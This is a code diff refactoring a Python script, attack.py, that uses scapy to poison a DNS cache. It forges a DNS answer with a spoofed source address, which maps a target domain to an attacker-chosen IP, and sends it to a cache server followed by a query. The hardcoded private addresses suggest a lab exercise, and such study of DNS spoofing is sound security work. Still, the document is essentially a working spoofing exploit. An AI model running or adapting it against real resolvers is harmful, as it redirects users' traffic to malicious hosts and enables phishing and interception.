@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 
 import sys
-import scapy.all
+from scapy.layers.inet import IP, UDP
+from scapy.layers.dns import DNS, DNSQR, DNSRR
+from scapy.sendrecv import send
 
 if len(sys.argv) < 3:
     print("Usage: attack.py [target domain] [spoofed IP]")
@@ -15,12 +17,34 @@ cache_server_port = 22222
 
 i = IP(dst=cache_server_ip, src="10.0.0.5")
 u = UDP(dport=cache_server_port, sport=53)
-d = DNS(id=0, qr=1, qd=DNSQR(qname=hostname), qdcount=1, ancount=1, nscount=0, arcount=0, an=(DNSRR(rrname=DNSQR(qname=hostname).qname, type='A', ttl=3600, rdata=fake_ip)))
+d = DNS(
+        id=0,
+        qr=1,
+        qd=DNSQR(qname=hostname),
+        qdcount=1,
+        ancount=1,
+        nscount=0,
+        arcount=0,
+        an=DNSRR(
+            rrname=DNSQR(qname=hostname).qname,
+            type="A",
+            ttl=3600,
+            rdata=fake_ip
+        )
+)
 
 
 response = i / u / d
 
-request = scapy.all.IP(dst=cache_server_ip) / UDP(dport=53) / DNS(id=500, qr=0, rd=1, qdcount=1, qd=DNSQR(qname=hostname, qtype="A", qclass="IN"))
+request = IP(dst=cache_server_ip) / \
+    UDP(dport=53) / \
+    DNS(
+            id=500,
+            qr=0,
+            rd=1,
+            qdcount=1,
+            qd=DNSQR(qname=hostname, qtype="A", qclass="IN")
+    )
 
 send(response, verbose=0)
 send(request, verbose=0)
